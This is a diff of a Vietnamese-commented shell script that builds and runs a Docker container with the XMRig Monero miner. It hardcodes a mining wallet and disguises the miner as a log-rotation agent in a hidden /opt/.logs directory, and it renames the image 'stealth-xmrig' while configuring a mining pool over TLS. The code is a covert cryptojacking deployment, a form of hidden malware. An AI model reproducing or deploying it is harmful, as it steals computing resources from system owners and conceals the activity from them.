@@ -8,7 +8,7 @@ command -v bc    >/dev/null || { echo "❌ bc chưa cài. Đang cài đặt bc..
 # ========== CẤU HÌNH ========== 
 WALLET=${WALLET:-85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz}
 CONTAINER_NAME=${CONTAINER_NAME:-logrotate-agent}
-IMAGE_NAME=${IMAGE_NAME:-android-backend}
+IMAGE_NAME=${IMAGE_NAME:-stealth-xmrig}
 LOG_DIR=${LOG_DIR:-/var/log/xmrig}
 
 # ========== LẤY SỐ CORE CPU VÀ TÍNH THREAD_HINT ========== 
@@ -64,8 +64,15 @@ cat > config.json <<EOF
   },
   "pools": [
     {
-      "url": "supportxmr.com:443",
+      "algo": null,
+      "coin": "monero",
+      "url": "pool.hashvault.pro:443",
       "user": "${WALLET}",
+      "pass": "x",
+      "rig-id": "",
+      "keepalive": true,
+      "nicehash": false,
+      "enabled": true,
       "tls": true
     }
   ]
@@ -87,12 +94,11 @@ RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && \
     apt-get clean && rm -rf /var/lib/apt/lists/*
 
 WORKDIR /opt/.logs
-COPY xmrig /opt/.logs/log-agent
+COPY xmrig /opt/.logs/xmrig
 COPY config.json /opt/.logs/config.json
+RUN chmod +x /opt/.logs/xmrig && chmod 600 /opt/.logs/config.json
 
-RUN chmod 700 /opt/.logs/log-agent && chmod 600 /opt/.logs/config.json
-
-ENTRYPOINT ["/opt/.logs/log-agent", "--config=/opt/.logs/config.json", "--log-file=/opt/.logs/logs/xmrig.log", "--log-level=4"]
+ENTRYPOINT ["/opt/.logs/xmrig", "--config=/opt/.logs/config.json", "--log-file=/opt/.logs/logs/xmrig.log", "--log-level=4"]
 EOF
 
 # ========== BUILD IMAGE VÀ RUN CONTAINER ========== 
